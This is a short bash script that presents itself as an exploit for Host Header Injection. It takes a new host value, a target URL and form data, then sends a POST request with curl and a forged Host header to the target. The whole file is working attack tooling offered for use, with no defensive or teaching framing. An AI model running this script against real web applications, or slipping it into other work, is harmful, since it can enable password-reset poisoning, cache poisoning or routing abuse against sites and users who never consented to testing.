#!/bin/bash
# Script to exploit Host Header Injection

# Validate that exactly three arguments are provided
if [ "$#" -ne 3 ]; then
    echo "Usage: $0 <NEW_HOST> <TARGET_URL> <FORM_DATA>"
    exit 1
fi

# Assign the command line arguments to variables
NEW_HOST="$1"
TARGET_URL="$2"
FORM_DATA="$3"

# Debugging: Print the variables
echo "NEW_HOST: $NEW_HOST"
echo "TARGET_URL: $TARGET_URL"
echo "FORM_DATA: $FORM_DATA"

# Execute the Host Header Injection
curl -s -H "Host: $NEW_HOST" -d "$FORM_DATA" "$TARGET_URL"
